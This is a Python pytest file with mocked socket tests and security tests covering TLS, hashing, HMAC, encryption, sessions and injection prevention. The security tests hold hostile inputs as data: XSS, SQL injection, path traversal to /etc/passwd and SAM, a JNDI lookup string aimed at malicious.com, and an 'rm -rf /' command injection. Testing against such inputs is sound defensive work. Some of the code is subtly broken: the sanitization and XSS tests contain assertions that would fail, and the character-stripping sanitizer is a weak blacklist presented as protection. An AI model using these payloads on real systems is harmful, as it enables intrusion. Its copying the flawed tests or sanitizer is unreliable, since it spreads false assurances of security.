"""Network and security tests for cloud native testing platform."""

import pytest
import socket
import ssl
import hashlib
import hmac
import base64
import time
from unittest.mock import Mock, patch, MagicMock
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


class TestNetworkConnectivity:
    """Test network connectivity and communication (30 tests)."""
    
    @pytest.mark.network
    def test_tcp_connection_success(self):
        """Test successful TCP connection."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.connect.return_value = None
            mock_socket.return_value = mock_sock
            
            # Test connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect(('localhost', 80))
            
            assert result is None
            mock_sock.connect.assert_called_once()

    @pytest.mark.network
    def test_tcp_connection_timeout(self):
        """Test TCP connection timeout."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.connect.side_effect = socket.timeout("Connection timed out")
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            with pytest.raises(socket.timeout):
                sock.connect(('192.168.1.100', 80))

    @pytest.mark.network
    def test_tcp_connection_refused(self):
        """Test TCP connection refused."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.connect.side_effect = ConnectionRefusedError("Connection refused")
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            with pytest.raises(ConnectionRefusedError):
                sock.connect(('localhost', 9999))

    @pytest.mark.network
    def test_udp_packet_send(self):
        """Test UDP packet sending."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.sendto.return_value = 5
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_sent = sock.sendto(b"hello", ('localhost', 8080))
            
            assert bytes_sent == 5
            mock_sock.sendto.assert_called_once_with(b"hello", ('localhost', 8080))

    @pytest.mark.network
    def test_udp_packet_receive(self):
        """Test UDP packet receiving."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.recvfrom.return_value = (b"hello", ('127.0.0.1', 8080))
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data, addr = sock.recvfrom(1024)
            
            assert data == b"hello"
            assert addr == ('127.0.0.1', 8080)

    @pytest.mark.network
    def test_dns_resolution_success(self):
        """Test successful DNS resolution."""
        with patch('socket.gethostbyname') as mock_resolve:
            mock_resolve.return_value = '93.184.216.34'
            
            ip = socket.gethostbyname('example.com')
            assert ip == '93.184.216.34'

    @pytest.mark.network
    def test_dns_resolution_failure(self):
        """Test DNS resolution failure."""
        with patch('socket.gethostbyname') as mock_resolve:
            mock_resolve.side_effect = socket.gaierror("Name resolution failed")
            
            with pytest.raises(socket.gaierror):
                socket.gethostbyname('nonexistent.example.invalid')

    @pytest.mark.network
    def test_port_scan_open(self):
        """Test port scan for open port."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.connect_ex.return_value = 0  # 0 indicates success
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('localhost', 80))
            
            assert result == 0  # Port is open

    @pytest.mark.network
    def test_port_scan_closed(self):
        """Test port scan for closed port."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.connect_ex.return_value = 1  # Non-zero indicates failure
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('localhost', 9999))
            
            assert result != 0  # Port is closed

    @pytest.mark.network
    def test_socket_timeout_setting(self):
        """Test socket timeout setting."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            
            mock_sock.settimeout.assert_called_once_with(5.0)

    @pytest.mark.network
    def test_socket_reuse_address(self):
        """Test socket address reuse option."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            mock_sock.setsockopt.assert_called_once_with(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    @pytest.mark.network
    def test_socket_binding_success(self):
        """Test successful socket binding."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.bind.return_value = None
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.bind(('localhost', 8080))
            
            assert result is None
            mock_sock.bind.assert_called_once_with(('localhost', 8080))

    @pytest.mark.network
    def test_socket_binding_address_in_use(self):
        """Test socket binding with address already in use."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.bind.side_effect = OSError("Address already in use")
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            with pytest.raises(OSError):
                sock.bind(('localhost', 80))

    @pytest.mark.network
    def test_socket_listening(self):
        """Test socket listening."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.listen.return_value = None
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.listen(5)
            
            assert result is None
            mock_sock.listen.assert_called_once_with(5)

    @pytest.mark.network
    def test_socket_accept_connection(self):
        """Test accepting socket connection."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_client_sock = Mock()
            mock_sock.accept.return_value = (mock_client_sock, ('127.0.0.1', 12345))
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_sock, addr = sock.accept()
            
            assert client_sock == mock_client_sock
            assert addr == ('127.0.0.1', 12345)

    @pytest.mark.network
    def test_http_request_simulation(self):
        """Test HTTP request simulation."""
        http_request = b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
        http_response = b"HTTP/1.1 200 OK\r\nContent-Length: 13\r\n\r\nHello, World!"
        
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.send.return_value = len(http_request)
            mock_sock.recv.return_value = http_response
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sent = sock.send(http_request)
            response = sock.recv(1024)
            
            assert sent == len(http_request)
            assert response == http_response

    @pytest.mark.network
    def test_ipv6_connection(self):
        """Test IPv6 connection."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.connect.return_value = None
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            result = sock.connect(('::1', 80))
            
            assert result is None
            mock_sock.connect.assert_called_once_with(('::1', 80))

    @pytest.mark.network
    def test_socket_keepalive(self):
        """Test socket keepalive option."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            mock_sock.setsockopt.assert_called_once_with(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    @pytest.mark.network
    def test_socket_nodelay(self):
        """Test TCP no delay option."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            mock_sock.setsockopt.assert_called_once_with(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    @pytest.mark.network
    def test_socket_buffer_sizes(self):
        """Test socket buffer size configuration."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            
            assert mock_sock.setsockopt.call_count == 2

    @pytest.mark.network
    def test_multicast_socket(self):
        """Test multicast socket configuration."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Simulate multicast group join
            mreq = socket.inet_aton('224.1.1.1') + socket.inet_aton('0.0.0.0')
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
            
            mock_sock.setsockopt.assert_called_once()

    @pytest.mark.network
    def test_raw_socket_creation(self):
        """Test raw socket creation (requires privileges)."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_socket.return_value = mock_sock
            
            # Raw socket creation (would require root privileges in reality)
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            mock_socket.assert_called_once_with(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    @pytest.mark.network
    def test_unix_domain_socket(self):
        """Test Unix domain socket."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.bind.return_value = None
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            sock.bind('/tmp/test.sock')
            
            mock_sock.bind.assert_called_once_with('/tmp/test.sock')

    @pytest.mark.network
    def test_socket_error_handling(self):
        """Test socket error handling."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.connect.side_effect = socket.error("Network unreachable")
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            with pytest.raises(socket.error):
                sock.connect(('192.168.1.1', 80))

    @pytest.mark.network
    def test_socket_shutdown(self):
        """Test socket shutdown."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.shutdown.return_value = None
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.shutdown(socket.SHUT_RDWR)
            
            mock_sock.shutdown.assert_called_once_with(socket.SHUT_RDWR)

    @pytest.mark.network
    def test_socket_close(self):
        """Test socket close."""
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            mock_sock.close.return_value = None
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.close()
            
            mock_sock.close.assert_called_once()

    @pytest.mark.network
    def test_select_io_multiplexing(self):
        """Test select-based I/O multiplexing."""
        with patch('select.select') as mock_select:
            mock_sock1 = Mock()
            mock_sock2 = Mock()
            mock_select.return_value = ([mock_sock1], [], [])
            
            import select
            ready_sockets, _, _ = select.select([mock_sock1, mock_sock2], [], [], 1.0)
            
            assert mock_sock1 in ready_sockets
            assert len(ready_sockets) == 1

    @pytest.mark.network
    def test_network_interface_info(self):
        """Test network interface information."""
        with patch('socket.if_nameindex') as mock_if_nameindex:
            mock_if_nameindex.return_value = [(1, 'lo'), (2, 'eth0'), (3, 'wlan0')]
            
            interfaces = socket.if_nameindex()
            assert len(interfaces) == 3
            assert ('lo', 'eth0', 'wlan0') == tuple(name for idx, name in interfaces)

    @pytest.mark.network
    def test_socket_address_family_detection(self):
        """Test socket address family detection."""
        ipv4_addr = '192.168.1.1'
        ipv6_addr = '2001:db8::1'
        
        # Test IPv4 address detection
        try:
            socket.inet_aton(ipv4_addr)
            is_ipv4 = True
        except socket.error:
            is_ipv4 = False
        
        assert is_ipv4 is True
        
        # Test IPv6 address detection
        try:
            socket.inet_pton(socket.AF_INET6, ipv6_addr)
            is_ipv6 = True
        except socket.error:
            is_ipv6 = False
        
        assert is_ipv6 is True

    @pytest.mark.network
    def test_bandwidth_simulation(self):
        """Test bandwidth simulation."""
        data_size = 1024 * 1024  # 1MB
        test_data = b'x' * data_size
        
        with patch('socket.socket') as mock_socket:
            mock_sock = Mock()
            # Simulate sending in chunks
            mock_sock.send.side_effect = [1024] * (data_size // 1024)
            mock_socket.return_value = mock_sock
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            total_sent = 0
            chunk_size = 1024
            
            for i in range(0, data_size, chunk_size):
                chunk = test_data[i:i+chunk_size]
                sent = sock.send(chunk)
                total_sent += sent
                
                if total_sent >= data_size:
                    break
            
            assert total_sent == data_size


class TestSecurityFeatures:
    """Test security features and cryptographic operations (25 tests)."""
    
    @pytest.mark.security
    def test_ssl_context_creation(self):
        """Test SSL context creation."""
        context = ssl.create_default_context()
        
        assert isinstance(context, ssl.SSLContext)
        assert context.check_hostname is True
        assert context.verify_mode == ssl.CERT_REQUIRED

    @pytest.mark.security
    def test_ssl_insecure_context(self):
        """Test insecure SSL context creation."""
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        assert context.check_hostname is False
        assert context.verify_mode == ssl.CERT_NONE

    @pytest.mark.security
    def test_ssl_certificate_verification(self):
        """Test SSL certificate verification."""
        with patch('ssl.create_default_context') as mock_ssl:
            mock_context = Mock()
            mock_context.check_hostname = True
            mock_context.verify_mode = ssl.CERT_REQUIRED
            mock_ssl.return_value = mock_context
            
            context = ssl.create_default_context()
            assert context.check_hostname is True
            assert context.verify_mode == ssl.CERT_REQUIRED

    @pytest.mark.security
    def test_tls_version_enforcement(self):
        """Test TLS version enforcement."""
        context = ssl.create_default_context()
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        context.maximum_version = ssl.TLSVersion.TLSv1_3
        
        assert context.minimum_version == ssl.TLSVersion.TLSv1_2
        assert context.maximum_version == ssl.TLSVersion.TLSv1_3

    @pytest.mark.security
    def test_password_hashing_bcrypt(self):
        """Test password hashing with bcrypt simulation."""
        password = "secure_password123"
        salt = "random_salt_16bytes"
        
        # Simulate bcrypt hashing
        import hashlib
        hashed = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000)
        
        assert len(hashed) == 32  # SHA256 produces 32 bytes
        assert hashed != password.encode()

    @pytest.mark.security
    def test_hmac_message_authentication(self):
        """Test HMAC message authentication."""
        key = b"secret_key"
        message = b"important_message"
        
        mac = hmac.new(key, message, hashlib.sha256).hexdigest()
        
        # Verify HMAC
        expected_mac = hmac.new(key, message, hashlib.sha256).hexdigest()
        assert mac == expected_mac

    @pytest.mark.security
    def test_hmac_timing_attack_protection(self):
        """Test HMAC timing attack protection."""
        key = b"secret_key"
        message = b"important_message"
        
        mac1 = hmac.new(key, message, hashlib.sha256).hexdigest()
        mac2 = "invalid_mac_same_length_as_mac1_for_timing_safety_test"
        
        # Use hmac.compare_digest for timing-safe comparison
        assert hmac.compare_digest(mac1, mac1) is True
        assert hmac.compare_digest(mac1, mac2) is False

    @pytest.mark.security
    def test_symmetric_encryption_fernet(self):
        """Test symmetric encryption with Fernet."""
        key = Fernet.generate_key()
        cipher = Fernet(key)
        
        plaintext = b"sensitive_data"
        encrypted = cipher.encrypt(plaintext)
        decrypted = cipher.decrypt(encrypted)
        
        assert encrypted != plaintext
        assert decrypted == plaintext

    @pytest.mark.security
    def test_key_derivation_pbkdf2(self):
        """Test key derivation with PBKDF2."""
        password = b"user_password"
        salt = b"random_salt_"
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = kdf.derive(password)
        
        assert len(key) == 32
        assert key != password

    @pytest.mark.security
    def test_base64_encoding_decoding(self):
        """Test Base64 encoding and decoding."""
        original_data = b"Hello, World!"
        encoded = base64.b64encode(original_data)
        decoded = base64.b64decode(encoded)
        
        assert encoded != original_data
        assert decoded == original_data
        assert isinstance(encoded, bytes)

    @pytest.mark.security
    def test_url_safe_base64(self):
        """Test URL-safe Base64 encoding."""
        data_with_special_chars = b"data+with/special=chars"
        url_safe_encoded = base64.urlsafe_b64encode(data_with_special_chars)
        decoded = base64.urlsafe_b64decode(url_safe_encoded)
        
        assert b'+' not in url_safe_encoded
        assert b'/' not in url_safe_encoded
        assert decoded == data_with_special_chars

    @pytest.mark.security
    def test_secure_random_generation(self):
        """Test secure random number generation."""
        import secrets
        
        # Generate secure random bytes
        random_bytes = secrets.token_bytes(32)
        assert len(random_bytes) == 32
        
        # Generate secure random string
        random_string = secrets.token_urlsafe(32)
        assert len(random_string) > 0
        
        # Two random generations should be different
        random_bytes2 = secrets.token_bytes(32)
        assert random_bytes != random_bytes2

    @pytest.mark.security
    def test_jwt_token_structure(self):
        """Test JWT token structure validation."""
        # Simulate JWT token structure
        header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').decode().rstrip('=')
        payload = base64.urlsafe_b64encode(b'{"sub":"1234567890","name":"John Doe"}').decode().rstrip('=')
        signature = "signature_would_be_here"
        
        jwt_token = f"{header}.{payload}.{signature}"
        parts = jwt_token.split('.')
        
        assert len(parts) == 3
        assert all(part for part in parts)

    @pytest.mark.security
    def test_input_sanitization(self):
        """Test input sanitization for security."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://malicious.com/}",
            "{{7*7}}"
        ]
        
        def sanitize_input(user_input):
            # Basic sanitization
            dangerous_chars = ['<', '>', '"', "'", '&', ';', '(', ')', '{', '}', '$']
            for char in dangerous_chars:
                user_input = user_input.replace(char, '')
            return user_input
        
        for malicious_input in malicious_inputs:
            sanitized = sanitize_input(malicious_input)
            assert '<script>' not in sanitized
            assert 'DROP TABLE' not in sanitized

    @pytest.mark.security
    def test_csrf_token_generation(self):
        """Test CSRF token generation."""
        import secrets
        import time
        
        def generate_csrf_token():
            timestamp = str(int(time.time()))
            random_part = secrets.token_urlsafe(16)
            return f"{timestamp}.{random_part}"
        
        token1 = generate_csrf_token()
        time.sleep(0.01)  # Small delay
        token2 = generate_csrf_token()
        
        assert '.' in token1
        assert '.' in token2
        assert token1 != token2

    @pytest.mark.security
    def test_rate_limiting_implementation(self):
        """Test rate limiting implementation."""
        import time
        from collections import defaultdict
        
        class RateLimiter:
            def __init__(self, max_requests=10, time_window=60):
                self.max_requests = max_requests
                self.time_window = time_window
                self.requests = defaultdict(list)
            
            def is_allowed(self, client_id):
                now = time.time()
                client_requests = self.requests[client_id]
                
                # Remove old requests
                client_requests[:] = [req_time for req_time in client_requests 
                                    if now - req_time < self.time_window]
                
                if len(client_requests) < self.max_requests:
                    client_requests.append(now)
                    return True
                return False
        
        limiter = RateLimiter(max_requests=2, time_window=1)
        
        assert limiter.is_allowed("client1") is True
        assert limiter.is_allowed("client1") is True
        assert limiter.is_allowed("client1") is False  # Rate limited

    @pytest.mark.security
    def test_session_token_expiration(self):
        """Test session token expiration."""
        import time
        
        class SessionManager:
            def __init__(self):
                self.sessions = {}
            
            def create_session(self, user_id, expiry_seconds=3600):
                import secrets
                token = secrets.token_urlsafe(32)
                expiry_time = time.time() + expiry_seconds
                self.sessions[token] = {"user_id": user_id, "expires": expiry_time}
                return token
            
            def is_valid_session(self, token):
                if token not in self.sessions:
                    return False
                return time.time() < self.sessions[token]["expires"]
        
        session_mgr = SessionManager()
        token = session_mgr.create_session("user123", expiry_seconds=1)
        
        assert session_mgr.is_valid_session(token) is True
        time.sleep(1.1)
        assert session_mgr.is_valid_session(token) is False

    @pytest.mark.security
    def test_password_strength_validation(self):
        """Test password strength validation."""
        import re
        
        def validate_password_strength(password):
            if len(password) < 8:
                return False, "Password must be at least 8 characters"
            if not re.search(r'[A-Z]', password):
                return False, "Password must contain uppercase letter"
            if not re.search(r'[a-z]', password):
                return False, "Password must contain lowercase letter"
            if not re.search(r'\d', password):
                return False, "Password must contain digit"
            if not re.search(r'[!@#$%^&*]', password):
                return False, "Password must contain special character"
            return True, "Password is strong"
        
        weak_passwords = ["password", "12345678", "Password", "Password1"]
        strong_password = "StrongP@ss1"
        
        for weak in weak_passwords:
            is_strong, _ = validate_password_strength(weak)
            assert is_strong is False
        
        is_strong, message = validate_password_strength(strong_password)
        assert is_strong is True

    @pytest.mark.security
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention."""
        # Simulate parameterized query
        def safe_query(user_id):
            # This would be a parameterized query in real code
            query = "SELECT * FROM users WHERE id = ?"
            params = (user_id,)
            return query, params
        
        def unsafe_query(user_id):
            # This would be vulnerable to SQL injection
            query = f"SELECT * FROM users WHERE id = {user_id}"
            return query
        
        malicious_input = "1; DROP TABLE users; --"
        
        safe_q, safe_params = safe_query(malicious_input)
        unsafe_q = unsafe_query(malicious_input)
        
        assert "DROP TABLE" not in safe_q
        assert "DROP TABLE" in unsafe_q
        assert malicious_input in safe_params

    @pytest.mark.security
    def test_xss_prevention(self):
        """Test XSS prevention."""
        import html
        
        def escape_html(user_input):
            return html.escape(user_input)
        
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>"
        ]
        
        for payload in xss_payloads:
            escaped = escape_html(payload)
            assert '<script>' not in escaped
            assert 'onerror=' not in escaped
            assert '&lt;' in escaped or '&gt;' in escaped

    @pytest.mark.security
    def test_directory_traversal_prevention(self):
        """Test directory traversal prevention."""
        import os
        
        def safe_file_access(filename, base_dir="/safe/directory"):
            # Resolve the absolute path
            safe_path = os.path.abspath(os.path.join(base_dir, filename))
            safe_base = os.path.abspath(base_dir)
            
            # Check if the resolved path is within the base directory
            return safe_path.startswith(safe_base)
        
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "../../sensitive_file.txt"
        ]
        
        safe_paths = [
            "document.txt",
            "folder/file.txt",
            "data.json"
        ]
        
        for dangerous_path in dangerous_paths:
            assert safe_file_access(dangerous_path) is False
        
        for safe_path in safe_paths:
            assert safe_file_access(safe_path) is True

    @pytest.mark.security
    def test_command_injection_prevention(self):
        """Test command injection prevention."""
        import shlex
        
        def safe_command_execution(user_input):
            # Use shlex to safely quote the input
            safe_input = shlex.quote(user_input)
            command = f"echo {safe_input}"
            return command
        
        def unsafe_command_execution(user_input):
            # This would be vulnerable to command injection
            command = f"echo {user_input}"
            return command
        
        malicious_input = "hello; rm -rf /"
        
        safe_cmd = safe_command_execution(malicious_input)
        unsafe_cmd = unsafe_command_execution(malicious_input)
        
        # Safe command should quote the dangerous input
        assert "rm -rf" not in safe_cmd.split("echo ")[1] or "'" in safe_cmd
        assert "rm -rf" in unsafe_cmd

    @pytest.mark.security
    def test_timing_attack_mitigation(self):
        """Test timing attack mitigation."""
        import time
        import hmac
        
        def vulnerable_comparison(secret, user_input):
            # Vulnerable: stops at first difference
            if len(secret) != len(user_input):
                return False
            for i in range(len(secret)):
                if secret[i] != user_input[i]:
                    return False
            return True
        
        def safe_comparison(secret, user_input):
            # Safe: uses constant-time comparison
            return hmac.compare_digest(secret, user_input)
        
        secret = "supersecretkey123"
        wrong_input = "wrongsecretkey123"
        
        # Both should return False, but safe comparison is timing-safe
        assert vulnerable_comparison(secret, wrong_input) is False
        assert safe_comparison(secret, wrong_input) is False
        assert safe_comparison(secret, secret) is True

    @pytest.mark.security
    def test_secure_headers_validation(self):
        """Test secure HTTP headers validation."""
        def validate_security_headers(headers):
            required_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': 'DENY',
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
                'Content-Security-Policy': "default-src 'self'"
            }
            
            missing_headers = []
            for header, expected_value in required_headers.items():
                if header not in headers:
                    missing_headers.append(header)
                elif headers[header] != expected_value:
                    missing_headers.append(f"{header} (incorrect value)")
            
            return len(missing_headers) == 0, missing_headers
        
        secure_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
            'Content-Security-Policy': "default-src 'self'"
        }
        
        insecure_headers = {
            'Content-Type': 'application/json'
        }
        
        is_secure, missing = validate_security_headers(secure_headers)
        assert is_secure is True
        
        is_secure, missing = validate_security_headers(insecure_headers)
        assert is_secure is False
        assert len(missing) > 0

    @pytest.mark.security
    def test_encryption_key_rotation(self):
        """Test encryption key rotation mechanism."""
        class KeyManager:
            def __init__(self):
                self.keys = {}
                self.current_key_id = None
            
            def generate_new_key(self):
                key_id = f"key_{len(self.keys) + 1}"
                key = Fernet.generate_key()
                self.keys[key_id] = key
                self.current_key_id = key_id
                return key_id
            
            def encrypt(self, data):
                if not self.current_key_id:
                    self.generate_new_key()
                
                key = self.keys[self.current_key_id]
                cipher = Fernet(key)
                encrypted = cipher.encrypt(data)
                return f"{self.current_key_id}:{encrypted.decode()}"
            
            def decrypt(self, encrypted_data):
                key_id, encrypted_part = encrypted_data.split(':', 1)
                key = self.keys[key_id]
                cipher = Fernet(key)
                return cipher.decrypt(encrypted_part.encode())
        
        key_manager = KeyManager()
        
        # Encrypt with first key
        data = b"sensitive information"
        encrypted1 = key_manager.encrypt(data)
        
        # Rotate key
        key_manager.generate_new_key()
        encrypted2 = key_manager.encrypt(data)
        
        # Both encryptions should be decryptable
        assert key_manager.decrypt(encrypted1) == data
        assert key_manager.decrypt(encrypted2) == data
        # But they should use different keys
        assert encrypted1.split(':')[0] != encrypted2.split(':')[0] 